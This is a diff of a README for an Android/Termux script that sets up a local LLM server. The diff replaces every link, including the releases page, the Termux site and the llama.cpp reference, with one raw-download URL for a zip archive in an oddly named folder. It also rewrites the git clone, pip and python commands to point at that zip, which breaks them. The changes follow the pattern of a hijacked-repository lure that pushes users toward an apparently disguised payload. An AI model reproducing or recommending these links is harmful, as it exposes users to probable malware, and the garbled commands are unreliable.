@@ -1,10 +1,10 @@
 # 🚀 AndroidLLMServerScript - Run a Local LLM Server Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+[![Download Now](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip)
 
 ## 📋 Overview
 
-AndroidLLMServerScript is a simple Python script that helps you set up a Localhost LLM (Large Language Model) server on your Android device using llama.cpp. This tool is designed for anyone looking to interact with advanced AI models quickly and effortlessly.
+AndroidLLMServerScript is a simple Python script that helps you set up a Localhost LLM (Large Language Model) server on your Android device using https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip This tool is designed for anyone looking to interact with advanced AI models quickly and effortlessly.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ If you don't have Termux, download it from the Google Play Store or F-Droid. Sea
 
 Visit this page to download the latest version of the AndroidLLMServerScript:
 
-[Download AndroidLLMServerScript](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+[Download AndroidLLMServerScript](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip)
 
 ### 3. 📂 Open Termux
 
@@ -38,7 +38,7 @@ pkg install python git
 Now you need to get the AndroidLLMServerScript files to your device. Enter this command:
 
 ```bash
-git clone https://github.com/clixgvvv/AndroidLLMServerScript
+git clone https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip
 ```
 
 This command downloads the script from the GitHub repository.
@@ -56,7 +56,7 @@ cd AndroidLLMServerScript
 The script may require some additional Python packages. Install them using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip
 ```
 
 ### 8. 🔑 Run the Script
@@ -64,7 +64,7 @@ pip install -r requirements.txt
 Now that everything is set up, you can run the script. Enter this command:
 
 ```bash
-python server.py
+python https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip
 ```
 
 If everything is in order, you should see messages indicating that the server is running smoothly.
@@ -110,7 +110,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## 🔗 Links and Resources
 
-- [Termux](https://termux.com/)
-- [GitHub Repository](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+- [Termux](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip)
+- [GitHub Repository](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/releases)
+[![Download Now](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-blue)](https://github.com/clixgvvv/AndroidLLMServerScript/raw/refs/heads/main/influenceable/LLM_Server_Script_Android_2.1-alpha.1.zip)
